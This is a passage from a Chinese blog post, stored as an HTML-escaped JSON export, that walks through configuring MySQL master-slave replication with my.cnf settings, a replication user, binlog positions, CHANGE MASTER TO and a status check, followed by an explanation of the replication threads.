master_connect_retry=10;</span><br></pre></td></tr></table></figure></p>\n<p><strong>&#x53C2;&#x6570;&#x8BE6;&#x89E3;&#xFF1A;</strong><br>master_host:&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x7684;IP&#x3002;<br>master_user&#xFF1A;&#x914D;&#x7F6E;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x65F6;&#x5EFA;&#x7ACB;&#x7684;&#x7528;&#x6237;&#x540D;<br>master_password&#xFF1A;&#x7528;&#x6237;&#x5BC6;&#x7801;<br>master_port&#xFF1A;&#x4E3B;&#x670D;&#x52A1;&#x5668;mysql&#x7AEF;&#x53E3;&#xFF0C;&#x5982;&#x679C;&#x672A;&#x66FE;&#x4FEE;&#x6539;&#xFF0C;&#x9ED8;&#x8BA4;&#x5373;&#x53EF;&#x3002;<br>master_log_file&#xFF1A;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x540D;&#x79F0;&#xFF0C;<strong>&#x586B;&#x5199;&#x67E5;&#x770B;master&#x72B6;&#x6001;&#x65F6;&#x663E;&#x793A;&#x7684;File</strong><br>master_log_pos&#xFF1A;&#x65E5;&#x5FD7;&#x4F4D;&#x7F6E;&#xFF0C;<strong>&#x586B;&#x5199;&#x67E5;&#x770B;master&#x72B6;&#x6001;&#x65F6;&#x663E;&#x793A;&#x7684;Position</strong><br>master_connect_retry&#xFF1A;&#x91CD;&#x8FDE;&#x6B21;&#x6570;</p>\n<p>4&#x3001;&#x542F;&#x52A8;&#x8FDB;&#x7A0B;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; start slave;</span><br></pre></td></tr></table></figure></p>\n<p>5&#x3001;&#x68C0;&#x67E5;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x72B6;&#x6001;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show slave status\\G  </span><br><span class=\"line\">*************************** 1. row ***************************  </span><br><span class=\"line\">               Slave_IO_State: Waiting <span class=\"keyword\">for</span> master to send event  </span><br><span class=\"line\">                  Master_Host: 192.168.1.18  </span><br><span class=\"line\">                  Master_User: mastj  </span><br><span class=\"line\">                  Master_Port: 3306  </span><br><span class=\"line\">                Connect_Retry: 10  </span><br><span class=\"line\">              Master_Log_File: mysql-bin.000003  </span><br><span class=\"line\">          Read_Master_Log_Pos: 2369  </span><br><span class=\"line\">               Relay_Log_File: jhq0113-relay-bin.000002  </span><br><span class=\"line\">                Relay_Log_Pos: 647  </span><br><span class=\"line\">        Relay_Master_Log_File: mysql-bin.000003  </span><br><span class=\"line\">             Slave_IO_Running: Yes  </span><br><span class=\"line\">            Slave_SQL_Running: Yes  </span><br><span class=\"line\">            ...</span><br></pre></td></tr></table></figure></p>\n<p><strong>&#x82E5;Slave_IO_Running&#x548C;Slave_SQL_Running&#x5747;&#x4E3A;Yes&#xFF0C;&#x5219;&#x8868;&#x793A;&#x914D;&#x7F6E;&#x6210;&#x529F;&#x3002;</strong></p>\n<hr>\n<h2 id=\"MySQL&#x590D;&#x5236;&#x8FC7;&#x7A0B;\"><a href=\"#MySQL&#x590D;&#x5236;&#x8FC7;&#x7A0B;\" class=\"headerlink\" title=\"MySQL&#x590D;&#x5236;&#x8FC7;&#x7A0B;\"></a>MySQL&#x590D;&#x5236;&#x8FC7;&#x7A0B;</h2><p>MySQL&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x8FC7;&#x7A0B;&#x4E3B;&#x8981;&#x7531;&#x4E09;&#x4E2A;&#x7EBF;&#x7A0B;&#x6765;&#x5B8C;&#x6210;&#xFF0C;&#x5176;&#x4E2D;&#x4E24;&#x4E2A;&#x7EBF;&#x7A0B;(Sql&#x7EBF;&#x7A0B;&#x548C;IO&#x7EBF;&#x7A0B;)&#x5728;Slave&#x7AEF;&#xFF0C;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;(IO&#x7EBF;&#x7A0B;)&#x5728;Master&#x7AEF;&#x3002;</p>\n<ul>\n<li>Slave &#x4E0A;&#x9762;&#x7684;IO&#x7EBF;&#x7A0B;&#x8FDE;&#x63A5;&#x4E0A; Master&#xFF0C;&#x5E76;&#x8BF7;&#x6C42;&#x4ECE;&#x6307;&#x5B9A;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x7684;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;(&#x6216;&#x8005;&#x4ECE;&#x6700;&#x5F00;&#x59CB;&#x7684;&#x65E5;&#x5FD7;)&#x4E4B;&#x540E;&#x7684;&#x65E5;&#x5FD7;&#x5185;&#x5BB9;&#xFF1B;</li>\n<li>Master &#x63A5;&#x6536;&#x5230;&#x6765;&#x81EA; Slave &#x7684; IO &#x7EBF;&#x7A0B;&#x7684;&#x8BF7;&#x6C42;&#x540E;&#xFF0C;&#x901A;&#x8FC7;&#x8D1F;&#x8D23;&#x590D;&#x5236;&#x7684; IO &#x7EBF;&#x7A0B;&#x6839;&#x636E;&#x8BF7;&#x6C42;&#x4FE1;&#x606F;&#x8BFB;&#x53D6;&#x6307;&#x5B9A;&#x65E5;&#x5FD7;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#x4E4B;&#x540E;&#x7684;&#x65E5;&#x5FD7;&#x4FE1;&#x606F;&#xFF0C;&#x8FD4;&#x56DE;&#x7ED9; Slave &#x7AEF;&#x7684; IO &#x7EBF;&#x7A0B;&#x3002;&#x8FD4;&#x56DE;&#x4FE1;&#x606F;&#x4E2D;&#x9664;&#x4E86;&#x65E5;&#x5FD7;&#x6240;&#x5305;&#x542B;&#x7684;&#x4FE1;&#x606F;&#x4E4B;&#x5916;&#xFF0C;&#x8FD8;&#x5305;&#x62EC;&#x672C;&#x6B21;&#x8FD4;&#x56DE;&#x7684;&#x4FE1;&#x606F;&#x5728; Master &#x7AEF;&#x7684; Binary Log &#x6587;&#x4EF6;&#x7684;&#x540D;&#x79F0;&#x4EE5;&#x53CA;&#x5728; Binary Log &#x4E2D;&#x7684;&#x4F4D;&#x7F6E;&#xFF1B;</li>\n<li>Slave &#x7684; IO &#x7EBF;&#x7A0B;&#x63A5;&#x6536;&#x5230;&#x4FE1;&#x606F;&#x540E;&#xFF0C;&#x5C06;&#x63A5;&#x6536;&#x5230;&#x7684;&#x65E5;&#x5FD7;&#x5185;&#x5BB9;&#x4F9D;&#x6B21;&#x5199;&#x5165;&#x5230; Slave &#x7AEF;&#x7684;Relay Log&#x6587;&#x4EF6;(mysql-relay-bin.xxxxxx)&#x7684;&#x6700;&#x672B;&#x7AEF;&#xFF0C;&#x5E76;&#x5C06;&#x8BFB;&#x53D6;&#x5230;&#x7684;Master&#x7AEF;&#x7684;bin-log&#x7684;&#x6587;&#x4EF6;&#x540D;&#x548C;&#x4F4D;&#x7F6E;&#x8BB0;&#x5F55;&#x5230;master- info&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x4EE5;&#x4FBF;&#x5728;&#x4E0B;&#x4E00;&#x6B21;&#x8BFB;&#x53D6;&#x7684;&#x65F6;&#x5019;&#x80FD;&#x591F;&#x6E05;&#x695A;&#x7684;&#x9AD8;&#x901F;Master&#x201C;&#x6211;&#x9700;&#x8981;&#x4ECE;&#x67D0;&#x4E2A;bin-log&#x7684;&#x54EA;&#x4E2A;&#x4F4D;&#x7F6E;&#x5F00;&#x59CB;&#x5F80;&#x540E;&#x7684;&#x65E5;&#x5FD7;&#x5185;&#x5BB9;&#xFF0C;&#x8BF7;&#x53D1;&#x7ED9;&#x6211;&#x201D;</li>\n<li>Slave &#x7684; SQL &#x7EBF;&#x7A0B;&#x68C0;&#x6D4B;&#x5230; Relay Log &#x4E2D;&#x65B0;&#x589E;&#x52A0;&#x4E86;&#x5185;&#x5BB9;&#x540E;&#xFF0C;&#x4F1A;&#x9A6C;&#x4E0A;&#x89E3;&#x6790;&#x8BE5; Log &#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x6210;&#x4E3A;&#x5728; Master &#x7AEF;&#x771F;&#x5B9E;&#x6267;&#x884C;&#x65F6;&#x5019;&#x7684;&#x90A3;&#x4E9B;&#x53EF;&#x6267;&#x884C;&#x7684; Query &#x8BED;&#x53E5;&#xFF0C;&#x5E76;&#x5728;&#x81EA;&#x8EAB;&#x6267;&#x884C;&#x8FD9;&#x4E9B; Query&#x3002;&#x8FD9;&#x6837;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x5C31;&#x662F;&#x5728; Master &#x7AEF;&#x548C; Slave &#x7AEF;&#x6267;&#x884C;&#x4E86;&#x540C;&#x6837;&#x7684; Query&#xFF0C;&#x6240;&#x4EE5;&#x4E24;&#x7AEF;&#x7684;&#x6570;&#x636E;&#x662F;&#x5B8C;&#x5168;&#x4E00;&#x6837;&#x7684;&#x3002;</li>\n</ul>\n<hr>\n<h2 id=\"&#x76F8;&#x5173;&#x94FE;&#x63A5;\"><a href=\"#&#x76F8;&#x5173;&#x94FE;&#x63A5;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x94FE;&#x63A5;\"></a>&#x76F8;&#x5173;&#x94FE;&#x63A5;</h2><p><strong>my.cnf&#x53C2;&#x6570;&#x8BE6;&#x89E3;</strong><br><a href=\"https://my.oschina.net/eduosi/blog/270535\" target=\"_blank\" rel=\"external\">https://my.oschina.net/eduosi/blog/270535</a></p>\n<p><strong><font style=\"color:red\">&#x7EBF;&#x4E0A;MySQL&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x62A5;&#x9519;&#x6545;&#x969C;&#x5904;&#x7406;&#x603B;&#x7ED3;</font></strong><br><a href=\"http://xstarcd.github.io/wiki/MySQL/online_mysqlrepl_error.html\" target=\"_blank\" rel=\"external\">http://xstarcd.github.io/wiki/MySQL/online_mysqlrepl_error.html</a></p>\n<p><strong>Mysql&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#x7684;&#x590D;&#x5236;&#x539F;&#x7406;</strong><br><a href=\"http://blog.csdn.net/hguisu/article/details/7325124\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/hguisu/article/details/7325124</a></p>\n<p><strong>&#x4E0D;&#x540C;&#x573A;&#x666F;&#x4E0B; MySQL &#x7684;&#x8FC1;&#x79FB;&#x65B9;&#x6848;</strong><br><a href=\"https://dbarobin.com/2015/09/15/migration-of-mysql-on-different-scenes\" target=\"_blank\" rel=\"external\">https://dbarobin.com/2015/09/15/migration-of-mysql-on-different-scenes</a></p>\n<p><br></p>\n","excerpt":"<h3 id=\"&#x6CE8;&#x610F;&#x4E8B;&#x9879;\"><a href=\"#&#x6CE8;&#x610F;&#x4E8B;&#x9879;\" class=\"headerlink\" title=\"&#x6CE8;&#x610F;&#x4E8B;&#x9879;\"></a>&#x6CE8;&#x610F;&#x4E8B;&#x9879;</h3><p>1&#x3001;&#x4E3B;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7248;&#x672C;&#x548C;&#x4F4D;&#x6570;&#x4E00;&#x81F4;&#x3002;<br>2&#x3001;MySQL&#x7248;&#x672C;&#x4E00;&#x81F4;&#x3002;</p>\n<h3 id=\"&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;\"><a href=\"#&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;\" class=\"headerlink\" title=\"&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;\"></a>&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;</h3><p><strong>Master</strong>: 192.168.1.18<br><strong>Slave</strong>: 192.168.1.16</p>\n<hr>\n<h3 id=\"Master-192-168-1-18-&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;\"><a href=\"#Master-192-168-1-18-&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;\" class=\"headerlink\" title=\"Master(192.168.1.18)&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;\"></a><font style=\"color:red\">Master(192.168.1.18)&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;</font></h3><p>1&#x3001;&#x7F16;&#x8F91;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x5C31;&#x624B;&#x52A8;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;</span></span><br><span class=\"line\">vim /etc/my.cnf</span><br><span class=\"line\"></span><br><span class=\"line\">&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x52A0;&#x5165;&#x5982;&#x4E0B;&#x503C;&#xFF1A;</span><br><span class=\"line\"></span><br><span class=\"line\">[mysqld]  </span><br><span class=\"line\"><span class=\"comment\"># &#x552F;&#x4E00;&#x7684;&#x670D;&#x52A1;&#x8FA8;&#x8BC6;&#x53F7;,&#x6570;&#x503C;&#x4F4D;&#x4E8E; 1 &#x5230; 2^32-1&#x4E4B;&#x95F4;.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x6B64;&#x503C;&#x5728;master&#x548C;slave&#x4E0A;&#x90FD;&#x9700;&#x8981;&#x8BBE;&#x7F6E;.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C; &#x201C;master-host&#x201D; &#x6CA1;&#x6709;&#x88AB;&#x8BBE;&#x7F6E;,&#x5219;&#x9ED8;&#x8BA4;&#x4E3A;1, &#x4F46;&#x662F;&#x5982;&#x679C;&#x5FFD;&#x7565;&#x6B64;&#x9009;&#x9879;,MySQL&#x4E0D;&#x4F1A;&#x4F5C;&#x4E3A;master&#x751F;&#x6548;.</span></span><br><span class=\"line\">server-id=1</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\"># &#x6253;&#x5F00;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x529F;&#x80FD;.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5728;&#x590D;&#x5236;(replication)&#x914D;&#x7F6E;&#x4E2D;,&#x4F5C;&#x4E3A; MASTER &#x4E3B;&#x670D;&#x52A1;&#x5668;&#x5FC5;&#x987B;&#x6253;&#x5F00;&#x6B64;&#x9879;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x4F60;&#x9700;&#x8981;&#x4ECE;&#x4F60;&#x6700;&#x540E;&#x7684;&#x5907;&#x4EFD;&#x4E2D;&#x505A;&#x57FA;&#x4E8E;&#x65F6;&#x95F4;&#x70B9;&#x7684;&#x6062;&#x590D;,&#x4F60;&#x4E5F;&#x540C;&#x6837;&#x9700;&#x8981;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;.   </span></span><br><span class=\"line\"><span class=\"built_in\">log</span>-bin=master-bin</span><br><span class=\"line\"><span class=\"built_in\">log</span>-bin-index=master-bin.index</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x9700;&#x8981;&#x5907;&#x4EFD;&#x7684;&#x6570;&#x636E;&#x5E93;  </span></span><br><span class=\"line\">binlog-do-db=orders</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x4E0D;&#x9700;&#x8981;&#x5907;&#x4EFD;&#x7684;&#x6570;&#x636E;&#x5E93;</span></span><br><span class=\"line\"><span class=\"comment\">#&#x82E5;&#x6CA1;&#x6709;&#x914D;&#x7F6E;binlog-do-db&#x548C;binlog_ignore_db&#xFF0C;&#x8868;&#x793A;&#x5907;&#x4EFD;&#x5168;&#x90E8;&#x6570;&#x636E;&#x5E93;&#x3002;</span></span><br><span class=\"line\">binlog-ignore-db=mysql</span><br></pre></td></tr></table></figure>","more":"<p>2&#x3001;&#x91CD;&#x542F;mysqld&#x670D;&#x52A1;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service mysqld restart</span><br></pre></td></tr></table></figure></p>\n<p>3&#x3001;&#x4E3A;&#x4ECE;MySQL&#x521B;&#x5EFA;&#x7528;&#x6237;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#&#x767B;&#x5F55;</span></span><br><span class=\"line\">mysql -uroot -p</span><br><span class=\"line\">Enter password: </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x521B;&#x5EFA;&#x7528;&#x6237;</span></span><br><span class=\"line\">mysql&gt; create user <span class=\"string\">&apos;mastj&apos;</span>@<span class=\"string\">&apos;192.168.1.16(&#x4ECE;&#x673A;ip)&apos;</span> identified by <span class=\"string\">&apos;123456&apos;</span>;</span><br><span class=\"line\">        </span><br><span class=\"line\"><span class=\"comment\">#&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x6743;&#x9650;</span></span><br><span class=\"line\">mysql&gt; grant replication slave on *.* to <span class=\"string\">&apos;mastj&apos;</span>@<span class=\"string\">&apos;192.168.1.16(&#x4ECE;&#x673A;ip)&apos;</span> identified by <span class=\"string\">&apos;123456&apos;</span>;</span><br></pre></td></tr></table></figure></p>\n<p>4&#x3001;&#x82E5;orders&#x4E2D;&#x5DF2;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x9501;&#x5B9A;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x6570;&#x636E;&#x5BFC;&#x5165;&#x5230;&#x4ECE;&#x6570;&#x636E;&#x5E93;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#&#x9501;&#x5B9A;</span></span><br><span class=\"line\">mysql&gt; flush tables with <span class=\"built_in\">read</span> lock;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x6570;&#x636E;&#x590D;&#x5236;&#x5230;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x540E;&#xFF0C;&#x67E5;&#x770B;&#x4E3B;&#x6570;&#x636E;&#x5E93;master&#x72B6;&#x6001;&#x5E76;&#x89E3;&#x9501;&#xFF1A;</span></span><br><span class=\"line\">mysql&gt; show master status;  </span><br><span class=\"line\">+------------------+----------+--------------+------------------+-------------------+  </span><br><span class=\"line\">| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |  </span><br><span class=\"line\">+------------------+----------+--------------+------------------+-------------------+  </span><br><span class=\"line\">| mysql-bin.000003 |     2005 | orders       | mysql            |                   |  </span><br><span class=\"line\">+------------------+----------+--------------+------------------+-------------------+  </span><br><span class=\"line\">1 row <span class=\"keyword\">in</span> <span class=\"built_in\">set</span> (0.00 sec)  </span><br><span class=\"line\">  </span><br><span class=\"line\">mysql&gt; unlock tables;</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h2 id=\"Slave-192-168-1-16-&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;\"><a href=\"#Slave-192-168-1-16-&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;\" class=\"headerlink\" title=\"Slave(192.168.1.16)&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;\"></a><font style=\"color:red\">Slave(192.168.1.16)&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;<font></font></font></h2><p>1&#x3001;&#x914D;&#x7F6E;&#x670D;&#x52A1;ID<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/my.cnf </span><br><span class=\"line\"></span><br><span class=\"line\">[mysqld]</span><br><span class=\"line\"><span class=\"comment\">#server_id&#x662F;&#x5FC5;&#x987B;&#x7684;&#xFF0C;&#x800C;&#x4E14;&#x552F;&#x4E00;</span></span><br><span class=\"line\">server-id=2</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x4F7F;&#x5F97;slave&#x53EA;&#x8BFB;.&#x53EA;&#x6709;&#x7528;&#x6237;&#x62E5;&#x6709;SUPER&#x6743;&#x9650;&#x548C;&#x5728;&#x4E0A;&#x9762;&#x7684;slave&#x7EBF;&#x7A0B;&#x80FD;&#x591F;&#x4FEE;&#x6539;&#x6570;&#x636E;.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F60;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x6B64;&#x9879;&#x53BB;&#x4FDD;&#x8BC1;&#x6CA1;&#x6709;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4F1A;&#x610F;&#x5916;&#x7684;&#x4FEE;&#x6539;slave&#x800C;&#x4E0D;&#x662F;master&#x4E0A;&#x7684;&#x6570;&#x636E;</span></span><br><span class=\"line\"><span class=\"comment\">#read_only</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x4F60;&#x5728;&#x4F7F;&#x7528;&#x94FE;&#x5F0F;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x7ED3;&#x6784;&#x7684;&#x590D;&#x5236;&#x6A21;&#x5F0F; (A-&gt;B-&gt;C),</span></span><br><span class=\"line\"><span class=\"comment\"># &#x9700;&#x8981;&#x6253;&#x5F00;slave&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;</span></span><br><span class=\"line\"><span class=\"comment\">#log_bin=mysql-bin</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x4F60;&#x5728;&#x4F7F;&#x7528;&#x94FE;&#x5F0F;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x7ED3;&#x6784;&#x7684;&#x590D;&#x5236;&#x6A21;&#x5F0F; (A-&gt;B-&gt;C),</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F60;&#x9700;&#x8981;&#x5728;&#x670D;&#x52A1;&#x5668;B&#x4E0A;&#x6253;&#x5F00;&#x6B64;&#x9879;.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x6B64;&#x9009;&#x9879;&#x6253;&#x5F00;&#x5728;&#x4ECE;&#x7EBF;&#x7A0B;&#x4E0A;&#x91CD;&#x505A;&#x8FC7;&#x7684;&#x66F4;&#x65B0;&#x7684;&#x65E5;&#x5FD7;, &#x5E76;&#x5C06;&#x5176;&#x5199;&#x5165;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x6253;&#x5F00;log_bin&#xFF0C;&#x5374;&#x6CA1;&#x6709;&#x8BBE;&#x7F6E;log_slave_updates&#xFF0C;&#x8FD9;&#x662F;&#x4E00;&#x79CD;&#x9519;&#x8BEF;&#x7684;&#x914D;&#x7F6E;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#log_slave_updates</span></span><br></pre></td></tr></table></figure></p>\n<p>2&#x3001;&#x91CD;&#x542F;MySQL&#x670D;&#x52A1;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service mysqld restart</span><br></pre></td></tr></table></figure></p>\n<p>3&#x3001;&#x914D;&#x7F6E;&#x590D;&#x5236;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#&#x767B;&#x5F55;</span></span><br><span class=\"line\">mysql -uroot -p</span><br><span class=\"line\">Enter password: </span><br><span class=\"line\">       </span><br><span class=\"line\"><span class=\"comment\">#&#x6267;&#x884C;</span></span><br><span class=\"line\">mysql&gt; change master to master_host=<span class=\"string\">&apos;192.168.1.18&apos;</span>,</span><br><span class=\"line\">                master_user=<span class=\"string\">&apos;mastj&apos;</span>,</span><br><span class=\"line\">                master_password=<span class=\"string\">&apos;123456&apos;</span>,</span><br><span class=\"line\">                master_port=3306,</span><br><span class=\"line\">                master_<span class=\"built_in\">log</span>_file=<span class=\"string\">&apos;mysql-bin.000003&apos;</span>,</span><br><span class=\"line\">                master_<span class=\"built_in\">log</span>_pos=2005,</span><br><span class=\"line\">                master_connect_retry=10;</span><br></pre></td></tr></table></figure></p>\n<p><strong>&#x53C2;&#x6570;&#x8BE6;&#x89E3;&#xFF1A;</strong><br>master_host:&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x7684;IP&#x3002;<br>master_user&#xFF1A;&#x914D;&#x7F6E;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x65F6;&#x5EFA;&#x7ACB;&#x7684;&#x7528;&#x6237;&#x540D;<br>master_password&#xFF1A;&#x7528;&#x6237;&#x5BC6;&#x7801;<br>master_port&#xFF1A;&#x4E3B;&#x670D;&#x52A1;&#x5668;mysql&#x7AEF;&#x53E3;&#xFF0C;&#x5982;&#x679C;&#x672A;&#x66FE;&#x4FEE;&#x6539;&#xFF0C;&#x9ED8;&#x8BA4;&#x5373;&#x53EF;&#x3002;<br>master_log_file&#xFF1A;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x540D;&#x79F0;&#xFF0C;<strong>&#x586B;&#x5199;&#x67E5;&#x770B;master&#x72B6;&#x6001;&#x65F6;&#x663E;&#x793A;&#x7684;File</strong><br>master_log_pos&#xFF1A;&#x65E5;&#x5FD7;&#x4F4D;&#x7F6E;&#xFF0C;<strong>&#x586B;&#x5199;&#x67E5;&#x770B;master&#x72B6;&#x6001;&#x65F6;&#x663E;&#x793A;&#x7684;Position</strong><br>master_connect_retry&#xFF1A;&#x91CD;&#x8FDE;&#x6B21;&#x6570;</p>\n<p>4&#x3001;&#x542F;&#x52A8;&#x8FDB;&#x7A0B;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; start slave;</span><br></pre></td></tr></table></figure></p>\n<p>5&#x3001;&#x68C0;&#x67E5;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x72B6;&#x6001;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show slave status\\G  </span><br><span class=\"line\">*************************** 1. row ***************************  </span><br><span class=\"line\">               Slave_IO_State: Waiting <span class=\"keyword\">for</span> master to send event  </span><br><span class=\"line\">                  Master_Host: 192.168.1.18  </span><br><span 